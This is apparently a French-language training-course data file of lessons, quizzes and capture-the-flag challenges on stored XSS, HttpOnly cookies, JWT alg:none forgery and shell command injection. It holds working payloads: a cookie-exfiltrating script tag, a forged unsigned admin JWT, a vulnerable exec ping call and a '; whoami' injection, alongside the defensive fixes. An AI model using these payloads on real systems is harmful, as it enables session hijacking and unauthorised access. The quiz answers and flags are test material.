            "isCorrect": false,
            "debrief": "Faux. Elle nécessite une connexion active."
          },
          {
            "text": "Elle est indétectable par les antivirus.",
            "isCorrect": false,
            "debrief": "Faux. Les pare-feux applicatifs détectent souvent les signatures XSS dans les URL."
          }
        ]
      }
    },
    "challenge": {
      "type": "webmail_target",
      "instructions": "Dans SkyMail, envoie un message contenant le payload <img src=x onerror=alert(document.cookie)>. Soumets la propriété ciblée par l'alerte pour lire les cookies (document.cookie) !",
      "flag": "document.cookie"
    }
  },
  {
    "id": "m4-l7",
    "unitId": "m4",
    "title": "7. XSS Stockée (Stored XSS) : Le Poison en Base",
    "icon": "☣️",
    "xp": 45,
    "lessonSlides": [
      {
        "title": "La Faille XSS la Plus Dangereuse",
        "bullets": [
          "Contrairement à la XSS réfléchie qui nécessite d'envoyer un lien à chaque victime, la **XSS Stockée** (Stored XSS) est un piège persistant posé au sol.",
          "L'attaquant soumet un message, un commentaire de blog ou un nom de profil contenant son payload JavaScript malveillant.",
          "Le serveur enregistre ce payload **directement dans sa base de données** !"
        ]
      },
      {
        "title": "L'Infection Automatique de Tous les Utilisateurs",
        "bullets": [
          "Dès lors, chaque fois qu'un utilisateur ordinaire ou un administrateur ouvre la boîte de réception ou consulte le profil, la page charge le texte depuis la base.",
          "Le script de l'attaquant s'exécute automatiquement dans le navigateur de la victime **sans qu'elle n'ait besoin de cliquer sur le moindre lien suspect** !"
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"25\" y=\"25\" width=\"100\" height=\"70\" rx=\"8\" fill=\"#0f172a\" stroke=\"#f43f5e\" stroke-width=\"2\"/>\n          <text x=\"75\" y=\"55\" fill=\"#f87171\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">Attaquant</text>\n          <text x=\"75\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Poste le script</text>\n          <path d=\"M 135 60 L 195 60\" stroke=\"#f43f5e\" stroke-width=\"2\"/>\n          <rect x=\"205\" y=\"25\" width=\"80\" height=\"70\" rx=\"8\" fill=\"#0f172a\" stroke=\"#3b82f6\" stroke-width=\"2\"/>\n          <text x=\"245\" y=\"55\" fill=\"#60a5fa\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">Base DB</text>\n          <text x=\"245\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Stocké !</text>\n          <path d=\"M 295 60 L 325 60\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <rect x=\"335\" y=\"25\" width=\"55\" height=\"70\" rx=\"8\" fill=\"#030712\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"362\" y=\"55\" fill=\"#34d399\" font-size=\"10\" font-family=\"monospace\" text-anchor=\"middle\">Admin</text>\n          <text x=\"362\" y=\"75\" fill=\"#f43f5e\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Infecté !</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "javascript",
        "lines": [
          {
            "num": 1,
            "text": "// Payload XSS Stocké dans le message de messagerie :"
          },
          {
            "num": 2,
            "text": "<script>fetch('/stolen?c=' + document.cookie);</script>",
            "isCritical": true,
            "note": "Ce script sera exécuté par l'administrateur lorsqu'il ouvrira son webmail"
          },
          {
            "num": 3,
            "text": "// Exfiltre le cookie administrateur vers le serveur de l'attaquant"
          }
        ],
        "prompt": "Clique sur la charge utile qui envoie le cookie vers un collecteur externe :"
      },
      "tokenPuzzle": {
        "instruction": "Assemble le payload d'exfiltration de cookies par fonction fetch :",
        "tokens": [
          "<script>fetch('/stolen?c='",
          "+ document.cookie);",
          "</script>",
          "alert(1)"
        ],
        "correctOrder": [
          "<script>fetch('/stolen?c='",
          "+ document.cookie);",
          "</script>"
        ]
      },
      "quickQuiz": {
        "prompt": "Pourquoi une vulnérabilité XSS Stockée (Stored) est-elle généralement classée avec un score de criticité beaucoup plus élevé qu'une XSS Réfléchie ?",
        "options": [
          {
            "text": "Parce qu'elle persiste en base de données et infecte passivement toute personne (dont les administrateurs) qui consulte la page, sans interaction particulière.",
            "isCorrect": true,
            "debrief": "Exact ! Le poison est permanent et frappe à grande échelle."
          },
          {
            "text": "Parce qu'elle formate automatiquement les cartes graphiques des utilisateurs.",
            "isCorrect": false,
            "debrief": "Faux. JavaScript dans un navigateur ne peut pas formater le matériel."
          },
          {
            "text": "Parce qu'elle ne fonctionne que la nuit.",
            "isCorrect": false,
            "debrief": "Faux. Elle s'exécute à toute heure dès consultation."
          },
          {
            "text": "Parce qu'elle empêche définitivement les câbles Ethernet de fonctionner.",
            "isCorrect": false,
            "debrief": "Faux. Aucun impact physique sur les câbles."
          }
        ]
      }
    },
    "challenge": {
      "type": "webmail_target",
      "instructions": "Dans SkyMail, rédige un message contenant le payload d'exfiltration. Dans le panneau DevTools du bas, récupère le drapeau CYBER{...} capturé lors du vol de session !",
      "flag": "CYBER{STORED_XSS_ADMIN_COOKIE_EXFILTRATED}"
    }
  },
  {
    "id": "m4-l8",
    "unitId": "m4",
    "title": "8. Vol de Session & Le Drapeau HttpOnly",
    "icon": "🛡️",
    "xp": 45,
    "lessonSlides": [
      {
        "title": "L'Objectif n°1 du XSS : Voler la Session",
        "bullets": [
          "Faire apparaître des boîtes de dialogue `alert(1)` ne sert qu'à démontrer la présence d'une faille.",
          "Dans une attaque réelle, le script malveillant lit `document.cookie` en secret et envoie la clé de session vers le serveur du pirate.",
          "Une fois en possession de ce jeton, le pirate prend le contrôle total du compte cible sans jamais avoir connu son mot de passe !"
        ]
      },
      {
        "title": "Le Bouclier Indispensable : Le Flag HttpOnly",
        "bullets": [
          "Comment les architectes web peuvent-ils interdire ce vol ?",
          "En ajoutant le mot-clé **HttpOnly** lors de la création du cookie : `Set-Cookie: session=xyz; HttpOnly; Secure`.",
          "Quand ce flag est présent, le navigateur **interdit formellement à tout code JavaScript** (y compris le code malveillant injecté via XSS) de lire ou d'accéder au cookie via `document.cookie` !"
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"25\" y=\"25\" width=\"165\" height=\"70\" rx=\"8\" fill=\"#0f172a\" stroke=\"#f43f5e\" stroke-width=\"2\"/>\n          <text x=\"107\" y=\"50\" fill=\"#f87171\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">Cookie SANS HttpOnly</text>\n          <text x=\"107\" y=\"70\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">document.cookie lisible en JS</text>\n          <text x=\"107\" y=\"85\" fill=\"#f43f5e\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">💥 Vol de session immédiat !</text>\n          <rect x=\"210\" y=\"25\" width=\"165\" height=\"70\" rx=\"8\" fill=\"#0f172a\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"292\" y=\"50\" fill=\"#34d399\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">Cookie AVEC HttpOnly</text>\n          <text x=\"292\" y=\"70\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Inaccessible en JavaScript</text>\n          <text x=\"292\" y=\"85\" fill=\"#10b981\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">🛡️ Protégé contre le vol XSS</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "http",
        "lines": [
          {
            "num": 1,
            "text": "HTTP/1.1 200 OK"
          },
          {
            "num": 2,
            "text": "Set-Cookie: session_id=abc123xyz; Path=/; HttpOnly; Secure; SameSite=Strict",
            "isCritical": true,
            "note": "Le drapeau HttpOnly bloque l'accès à la propriété document.cookie en JavaScript"
          }
        ],
        "prompt": "Clique sur l'attribut de sécurité de l'en-tête qui neutralise le vol de cookie par XSS :"
      },
      "tokenPuzzle": {
        "instruction": "Tape la directive de sécurité Set-Cookie protégeant les jetons de session :",
        "tokens": [
          "Set-Cookie: session=xyz;",
          "HttpOnly;",
          "Secure;",
          "alert(1);"
        ],
        "correctOrder": [
          "Set-Cookie: session=xyz;",
          "HttpOnly;",
          "Secure;"
        ]
      },
      "quickQuiz": {
        "prompt": "Quelle protection concrète le drapeau (flag) 'HttpOnly' apporte-t-il à un cookie de session ?",
        "options": [
          {
            "text": "Il oblige l'utilisateur à taper son mot de passe toutes les 30 secondes.",
            "isCorrect": false,
            "debrief": "Faux. HttpOnly n'affecte pas la fréquence de frappe du mot de passe."
          },
          {
            "text": "Il supprime automatiquement les e-mails reçus.",
            "isCorrect": false,
            "debrief": "Faux. HttpOnly est un attribut de sécurité de cookie."
          },
          {
            "text": "Il interdit au serveur d'éteindre sa carte réseau.",
            "isCorrect": false,
            "debrief": "Faux. Cela n'a aucun rapport matériel."
          },
          {
            "text": "Il interdit formellement au code JavaScript exécuté dans la page d'accéder au cookie via document.cookie.",
            "isCorrect": true,
            "debrief": "Exactement ! Le cookie est transporté uniquement dans les en-têtes HTTP et masqué au JavaScript."
          }
        ]
      }
    },
    "challenge": {
      "type": "webmail_target",
      "instructions": "Dans le Webmail SkyMail, analyse l'intercepteur de requêtes HTTP du panneau inférieur et soumets la valeur du drapeau de cookie dérobé CYBER{...} !",
      "flag": "CYBER{STORED_XSS_ADMIN_COOKIE_EXFILTRATED}"
    }
  },
  {
    "id": "m4-l9",
    "unitId": "m4",
    "title": "9. Anatomie d'un Jeton JWT",
    "icon": "🎟️",
    "xp": 45,
    "lessonSlides": [
      {
        "title": "Le Passeport Moderne du Web : JWT",
        "bullets": [
          "Les applications modernes et les API utilisent massivement les jetons **JWT** (JSON Web Tokens).",
          "Un JWT est un passeport d'identité numérique encodé en texte compact, composé de **trois parties séparées par des points** :",
          "`HEADER.PAYLOAD.SIGNATURE`"
        ]
      },
      {
        "title": "Les Trois Parties Décortiquées",
        "bullets": [
          "1. **Header** (En-tête) : indique l'algorithme de chiffrement (souvent `{\"alg\": \"HS256\", \"typ\": \"JWT\"}`).",
          "2. **Payload** (Données) : contient les informations de ton compte (ex: `{\"user\": \"operator\", \"role\": \"analyst\"}`).",
          "3. **Signature** : calculée à partir du Header, du Payload et d'une clé secrète connue uniquement du serveur pour empêcher toute modification.",
          "Attention : le Header et le Payload ne sont **PAS chiffrés**, ils sont simplement encodés en **Base64Url** et lisibles par n'importe qui !"
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"25\" y=\"30\" width=\"105\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#f43f5e\" stroke-width=\"2\"/>\n          <text x=\"77\" y=\"55\" fill=\"#f87171\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">HEADER</text>\n          <text x=\"77\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">{\"alg\":\"HS256\"}</text>\n          <text x=\"135\" y=\"65\" fill=\"#fff\" font-size=\"16\" font-family=\"monospace\" text-anchor=\"middle\">.</text>\n          <rect x=\"145\" y=\"30\" width=\"110\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#3b82f6\" stroke-width=\"2\"/>\n          <text x=\"200\" y=\"55\" fill=\"#60a5fa\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">PAYLOAD</text>\n          <text x=\"200\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">{\"role\":\"user\"}</text>\n          <text x=\"260\" y=\"65\" fill=\"#fff\" font-size=\"16\" font-family=\"monospace\" text-anchor=\"middle\">.</text>\n          <rect x=\"270\" y=\"30\" width=\"105\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"322\" y=\"55\" fill=\"#34d399\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">SIGNATURE</text>\n          <text x=\"322\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">HMACSHA256</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "javascript",
        "lines": [
          {
            "num": 1,
            "text": "// Décodage du Payload d'un jeton JWT en clair :"
          },
          {
            "num": 2,
            "text": "const payload = JSON.parse(atob(token.split('.')[1]));",
            "isCritical": true,
            "note": "Le split('.')[1] isole le payload Base64Url sans clé secrète requise"
          },
          {
            "num": 3,
            "text": "console.log(payload); // { id: 1001, role: 'user' }"
          }
        ],
        "prompt": "Clique sur l'instruction JavaScript qui extrait et décode le payload du JWT :"
      },
      "tokenPuzzle": {
        "instruction": "Ordonne les 3 segments constitutifs d'un jeton JWT standard :",
        "tokens": [
          "HEADER",
          ".",
          "PAYLOAD",
          ".",
          "SIGNATURE"
        ],
        "correctOrder": [
          "HEADER",
          ".",
          "PAYLOAD",
          ".",
          "SIGNATURE"
        ]
      },
      "quickQuiz": {
        "prompt": "Les données contenues dans le Payload d'un JWT standard (non JWE) sont-elles chiffrées et confidentielles ?",
        "options": [
          {
            "text": "Seul l'opérateur téléphonique peut les lire.",
            "isCorrect": false,
            "debrief": "Faux. N'importe qui possédant le jeton peut lire le JSON."
          },
          {
            "text": "Non, elles sont simplement encodées en Base64Url et n'importe qui peut les décoder et les lire instantanément.",
            "isCorrect": true,
            "debrief": "Exact ! Base64Url n'est PAS un chiffrement. Ne stockez jamais de données confidentielles dans un JWT."
          },
          {
            "text": "Oui, elles sont protégées par une clé militaire inviolable.",
            "isCorrect": false,
            "debrief": "Faux. Un simple décodage base64 révèle tout en clair."
          },
          {
            "text": "Elles s'effacent automatiquement si on les ouvre.",
            "isCorrect": false,
            "debrief": "Faux. C'est une simple chaîne textuelle ASCII."
          }
        ]
      }
    },
    "challenge": {
      "type": "jwt_target",
      "instructions": "Dans la console Gateway JWT ci-dessous, examine le Header du jeton par défaut. Soumets l'algorithme cryptographique utilisé (HS256) !",
      "flag": "HS256"
    }
  },
  {
    "id": "m4-l10",
    "unitId": "m4",
    "title": "10. La Faille JWT de Légende : alg: none",
    "icon": "🔓",
    "xp": 50,
    "lessonSlides": [
      {
        "title": "La Spécification RFC Qui a Tout Cassé",
        "bullets": [
          "Dans la spécification officielle des JWT (RFC 7519), les créateurs ont inclus un algorithme spécial nommé **none** pour les tests ou les jetons non signés.",
          "Mais des bibliothèques de code mal conçues ont commis une erreur dramatique : elles vérifient la signature en fonction de l'algorithme **annoncé par le jeton lui-même** !"
        ]
      },
      {
        "title": "Devenir Admin Sans Clé Secrète",
        "bullets": [
          "L'attaque est d'une simplicité désarmante :",
          "1. L'attaquant modifie le Header en remplaçant `\"alg\": \"HS256\"` par `\"alg\": \"none\"`.",
          "2. Dans le Payload, il change `\"role\": \"user\"` en `\"role\": \"admin\"`.",
          "3. Il supprime complètement la signature à la fin (en laissant le point final : `HEADER.PAYLOAD.`).",
          "Le serveur lit `alg: none`, conclut qu'aucune signature n'est requise, valide le jeton et accorde les pleins pouvoirs d'administrateur !"
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"25\" y=\"25\" width=\"165\" height=\"70\" rx=\"8\" fill=\"#0f172a\" stroke=\"#f43f5e\" stroke-width=\"2\"/>\n          <text x=\"107\" y=\"50\" fill=\"#f87171\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">{\"alg\":\"none\"}</text>\n          <text x=\"107\" y=\"70\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">{\"role\":\"admin\"}</text>\n          <text x=\"107\" y=\"85\" fill=\"#f43f5e\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Signature = VIDE</text>\n          <path d=\"M 200 60 L 235 60\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <rect x=\"245\" y=\"25\" width=\"140\" height=\"70\" rx=\"8\" fill=\"#030712\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"315\" y=\"50\" fill=\"#34d399\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">Vérification : PASS</text>\n          <text x=\"315\" y=\"70\" fill=\"#34d399\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Accès Root Accordé !</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "javascript",
        "lines": [
          {
            "num": 1,
            "text": "// Forger un faux jeton administrateur non signé avec alg: none :"
          },
          {
            "num": 2,
            "text": "const header = btoa(JSON.stringify({ alg: 'none', typ: 'JWT' }));",
            "isCritical": true,
            "note": "alg: none ordonne à la bibliothèque de contourner la vérification de signature"
          },
          {
            "num": 3,
            "text": "const payload = btoa(JSON.stringify({ user: 'admin', role: 'admin' }));"
          },
          {
            "num": 4,
            "text": "const fakeToken = `${header}.${payload}.`; // Remarquez le point final sans signature !"
          }
        ],
        "prompt": "Clique sur la ligne définissant l'algorithme 'none' :"
      },
      "tokenPuzzle": {
        "instruction": "Assemble le header JSON exploitant la vulnérabilité alg: none :",
        "tokens": [
          "{",
          "\"alg\": \"none\",",
          "\"typ\": \"JWT\"",
          "}"
        ],
        "correctOrder": [
          "{",
          "\"alg\": \"none\",",
          "\"typ\": \"JWT\"",
          "}"
        ]
      },
      "quickQuiz": {
        "prompt": "Pourquoi la vulnérabilité 'alg: none' permet-elle d'usurper n'importe quel rôle sans connaître la clé secrète du serveur ?",
        "options": [
          {
            "text": "Parce que la bibliothèque vérifie la signature selon l'algorithme choisi par le client, et accepte les jetons sans signature si le header annonce 'none'.",
            "isCorrect": true,
            "debrief": "Exact ! Le serveur écoute aveuglément le client au lieu d'imposer son propre algorithme."
          },
          {
            "text": "Parce que cela convertit le serveur en passerelle FTP.",
            "isCorrect": false,
            "debrief": "Faux. Cela ne modifie aucun protocole de transport."
          },
          {
            "text": "Parce que cela vide le cache DNS du fournisseur.",
            "isCorrect": false,
            "debrief": "Faux. Le DNS n'intervient pas dans la validation du JWT."
          },
          {
            "text": "Parce que le mot 'none' est le mot de passe secret universel de Linux.",
            "isCorrect": false,
            "debrief": "Faux. 'none' est un mot-clé de la spécification RFC, pas un mot de passe."
          }
        ]
      }
    },
    "challenge": {
      "type": "jwt_target",
      "instructions": "Dans la console JWT Gateway, bascule l'algorithme sur 'none', change le rôle en 'admin' et valide le jeton pour usurper les accès. Soumets le drapeau CYBER{...} accordé !",
      "flag": "CYBER{JWT_ALG_NONE_SIGNATURE_BYPASS_SUCCESS}"
    }
  },
  {
    "id": "m4-l11",
    "unitId": "m4",
    "title": "11. ★ BOSS FIGHT CLIENT : IDOR & JWT ★",
    "icon": "👑",
    "xp": 100,
    "isBoss": true,
    "lessonSlides": [
      {
        "title": "L'Épreuve Finale de Sécurité Côté Client",
        "bullets": [
          "Tu as appris à dissocier le client du backend, à manipuler les DevTools F12, à comprendre les cookies et l'impact de `HttpOnly`, à exploiter les failles de contrôle d'accès IDOR, à distinguer XSS réfléchie et XSS stockée, et à forger des faux jetons d'authentification JWT.",
          "Pour remporter le badge de la Piste 4, falsifie le jeton JWT avec `alg: none` pour obtenir le statut administrateur suprême et valider la compromission client !"
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"20\" y=\"20\" width=\"360\" height=\"80\" rx=\"10\" fill=\"#030712\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n          <text x=\"200\" y=\"55\" fill=\"#fbbf24\" font-size=\"14\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">★ ÉPREUVE D'HOMOLOGATION CLIENT PRO ★</text>\n          <text x=\"200\" y=\"75\" fill=\"#94a3b8\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">Manipulation DevTools ➔ Falsification JWT alg: none</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "javascript",
        "lines": [
          {
            "num": 1,
            "text": "# Exploitation de la passerelle API avec jeton falsifié alg: none :"
          },
          {
            "num": 2,
            "text": "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
            "isCritical": true,
            "note": "Jeton forgé valide permettant la prise de contrôle immédiate"
          },
          {
            "num": 3,
            "text": "Status: 200 OK - Access Granted"
          }
        ],
        "prompt": "Clique sur l'en-tête Authorization transportant le jeton alg: none forgé :"
      },
      "tokenPuzzle": {
        "instruction": "Construis l'en-tête HTTP complet avec le porteur du jeton d'authentification :",
        "tokens": [
          "Authorization:",
          "Bearer",
          "HEADER.PAYLOAD.",
          "Cookie:"
        ],
        "correctOrder": [
          "Authorization:",
          "Bearer",
          "HEADER.PAYLOAD."
        ]
      },
      "quickQuiz": {
        "prompt": "Comment une équipe de développement peut-elle éliminer définitivement la vulnérabilité 'alg: none' sur son infrastructure ?",
        "options": [
          {
            "text": "En masquant le code HTML de la page d'accueil.",
            "isCorrect": false,
            "debrief": "Faux. C'est de la sécurité par l'obscurité totalement inefficace."
          },
          {
            "text": "En interdisant les caractères alphabétiques dans les mots de passe.",
            "isCorrect": false,
            "debrief": "Faux. Cela réduirait considérablement la sécurité."
          },
          {
            "text": "En forçant explicitement l'algorithme attendu (ex: HS256) lors de la vérification, en rejetant catégoriquement tout algorithme non approuvé.",
            "isCorrect": true,
            "debrief": "Exactement ! Le backend doit imposer son algorithme sans jamais croire celui déclaré par le client."
          },
          {
            "text": "En redémarrant le serveur web toutes les heures.",
            "isCorrect": false,
            "debrief": "Faux. Le redémarrage ne corrige aucun bogue de validation."
          }
        ]
      }
    },
    "challenge": {
      "type": "jwt_target",
      "instructions": "Dans la console JWT Gateway, configure l'algorithme sur 'none', le rôle sur 'admin' et soumets le jeton à l'évaluation pour valider la mission !",
      "flag": "CYBER{JWT_ALG_NONE_SIGNATURE_BYPASS_SUCCESS}"
    }
  },
  {
    "id": "m5-l1",
    "unitId": "m5",
    "title": "1. Qu'est-ce qu'une Command Injection (RCE) ?",
    "icon": "⚡",
    "xp": 40,
    "lessonSlides": [
      {
        "title": "La Faille Serveur Suprême : RCE",
        "bullets": [
          "**RCE** signifie **Remote Code Execution** (Exécution de Code à Distance).",
          "C'est le Graal absolu de tout attaquant : réussir à forcer le serveur distant à exécuter n'importe quelle commande système comme s'il était assis devant l'écran du data center !",
          "Cela se produit quand une application web fait appel à des outils du système d'exploitation (comme `ping`, `nslookup`, `convert`) pour accomplir une tâche."
        ]
      },
      {
        "title": "L'Exemple Typique du Ping Web",
        "bullets": [
          "Imagine une page d'administration réseau avec un champ *Tester la connectivité d'une IP*.",
          "Côté serveur, le développeur exécute en arrière-plan : `exec(\"ping -c 2 \" + userIP)`.",
          "Si l'utilisateur tape une IP normale `127.0.0.1`, tout va bien. Mais que se passe-t-il s'il ajoute des caractères spéciaux du shell ?"
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"25\" y=\"20\" width=\"350\" height=\"80\" rx=\"8\" fill=\"#030712\" stroke=\"#f43f5e\" stroke-width=\"2\"/>\n          <text x=\"35\" y=\"45\" fill=\"#f87171\" font-size=\"11\" font-family=\"monospace\">APPEL SYSTÈME VULNÉRABLE :</text>\n          <text x=\"35\" y=\"70\" fill=\"#94a3b8\" font-size=\"11\" font-family=\"monospace\">child_process.exec(\"ping -c 2 \" + <tspan fill=\"#f59e0b\" font-weight=\"bold\">targetIP</tspan>)</text>\n          <text x=\"35\" y=\"88\" fill=\"#38bdf8\" font-size=\"9\" font-family=\"monospace\">Exécuté avec les droits du serveur web (www-data)</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "javascript",
        "lines": [
          {
            "num": 1,
            "text": "// ❌ CODE BACKEND DANGEREUX : Appel direct au shell système :"
          },
          {
            "num": 2,
            "text": "exec(`ping -c 1 ${req.body.ip}`, (error, stdout) => {",
            "isCritical": true,
            "note": "exec invoque /bin/sh : tout métacaractère injecté sera exécuté comme une commande distincte"
          },
          {
            "num": 3,
            "text": "  res.send(stdout);"
          },
          {
            "num": 4,
            "text": "});"
          }
        ],
        "prompt": "Clique sur la ligne de code exécutant la commande shell non assainie :"
      },
      "tokenPuzzle": {
        "instruction": "Assemble l'appel système vulnérable de la fonction de diagnostic :",
        "tokens": [
          "exec(`ping -c 1",
          "${req.body.ip}`,",
          "(err, stdout) => {});"
        ],
        "correctOrder": [
          "exec(`ping -c 1",
          "${req.body.ip}`,",
          "(err, stdout) => {});"
        ]
      },
      "quickQuiz": {
        "prompt": "Quelle est la conséquence immédiate d'une vulnérabilité d'injection de commande (RCE) réussie ?",
        "options": [
          {
            "text": "L'attaquant peut exécuter des commandes arbitraires du système d'exploitation avec les droits du processus du serveur web.",
            "isCorrect": true,
            "debrief": "Exact ! Cela permet de lire des fichiers, voler des identifiants et installer une porte dérobée."
          },
          {
            "text": "La base de données SQLite est automatiquement sauvegardée sur une clé USB.",
            "isCorrect": false,
            "debrief": "Faux. Une RCE n'effectue aucune sauvegarde automatique."
          },
          {
            "text": "La vitesse du ventilateur du serveur est réduite à zéro.",
            "isCorrect": false,
            "debrief": "Faux. RCE est une exécution de logique logicielle."
          },
          {
            "text": "L'écran de l'ordinateur de l'attaquant s'éteint pour économiser l'énergie.",
            "isCorrect": false,
            "debrief": "Faux. L'attaque donne un contrôle accru, elle n'éteint rien."
          }
        ]
      }
    },
    "challenge": {
      "type": "ping_target",
      "instructions": "Dans l'outil de diagnostic Net-Probe ci-dessous, teste une adresse IP légitime en saisissant '127.0.0.1'. Soumets la première ligne de réponse ping retournée (64 bytes from 127.0.0.1) !",
      "flag": "64 bytes from 127.0.0.1"
    }
  },
  {
    "id": "m5-l2",
    "unitId": "m5",
    "title": "2. Les Métacaractères Shell (;, &&, |)",
    "icon": "🔗",
    "xp": 40,
    "lessonSlides": [
      {
        "title": "Comment Enchaîner Deux Commandes en Bash",
        "bullets": [
          "Dans un terminal Bash, tu n'es pas obligé d'appuyer sur Entrée pour chaque ordre. Tu peux chaîner plusieurs commandes sur une seule ligne à l'aide de **métacaractères** :",
          "• `;` (point-virgule) : exécute la première commande, puis exécute la seconde quoi qu'il arrive.",
          "• `&&` (double ET commercial) : exécute la seconde commande **uniquement si la première a réussi**.",
          "• `||` (double barre) : exécute la seconde commande si la première a échoué.",
          "• `|` (pipe) : injecte la sortie de la première dans l'entrée de la seconde."
        ]
      },
      {
        "title": "Détourner le Ping",
        "bullets": [
          "Si le serveur exécute `ping -c 1 [ENTREE]`, et que l'attaquant tape :",
          "`127.0.0.1; whoami`",
          "Le shell Linux exécute le ping, puis exécute immédiatement `whoami` !",
          "Le serveur web renvoie alors le nom de son utilisateur système (souvent `www-data`)."
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"25\" y=\"25\" width=\"140\" height=\"70\" rx=\"8\" fill=\"#0f172a\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"95\" y=\"55\" fill=\"#38bdf8\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">ping -c 1 127.0.0.1</text>\n          <text x=\"95\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Commande n°1</text>\n          <rect x=\"180\" y=\"45\" width=\"40\" height=\"30\" rx=\"6\" fill=\"#f59e0b\"/>\n          <text x=\"200\" y=\"65\" fill=\"#000\" font-size=\"16\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">;</text>\n          <rect x=\"235\" y=\"25\" width=\"140\" height=\"70\" rx=\"8\" fill=\"#0f172a\" stroke=\"#f43f5e\" stroke-width=\"2\"/>\n          <text x=\"305\" y=\"55\" fill=\"#f87171\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">whoami</text>\n          <text x=\"305\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Commande n°2 injectée !</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "# Injection de commande via le séparateur point-virgule ; :"
          },
          {
            "num": 2,
            "text": "operator@cyberlab:~$ ping -c 1 127.0.0.1; whoami",
            "isCritical": true,
            "note": "Le point-virgule sépare deux commandes indépendantes exécutées à la suite"
          },
          {
            "num": 3,
            "text": "64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.03 ms"
          },
          {
            "num": 4,
            "text": "www-data"
          }
        ],
        "prompt": "Clique sur la ligne démontrant l'enchaînement de commandes avec le point-virgule :"
      },
      "tokenPuzzle": {
        "instruction": "Assemble le payload d'injection pour tester whoami après le ping :",
        "tokens": [
          "127.0.0.1;",
          "whoami",
          "pwd",
          "rm"
        ],
        "correctOrder": [
          "127.0.0.1;",
          "whoami"
        ]
      },
      "quickQuiz": {
        "prompt": "Quel symbole shell universel permet d'exécuter une seconde commande indépendamment du succès de la première ?",
        "options": [
          {
            "text": "L'arobase '@'",
            "isCorrect": false,
            "debrief": "Faux. '@' sert aux tableaux ou aux utilisateurs."
          },
          {
            "text": "Le point-virgule ';' (sépare deux instructions consécutives en Bash).",
            "isCorrect": true,
            "debrief": "Exact ! Le point-virgule est le délimiteur standard de fin d'instruction shell."
          },
          {
            "text": "Le point d'interrogation '?'",
            "isCorrect": false,
            "debrief": "Faux. '?' est un métacaractère de remplacement de caractère unique."
          },
          {
            "text": "Le tiret bas '_'",
            "isCorrect": false,
            "debrief": "Faux. '_' est un caractère alphanumérique classique."
          }
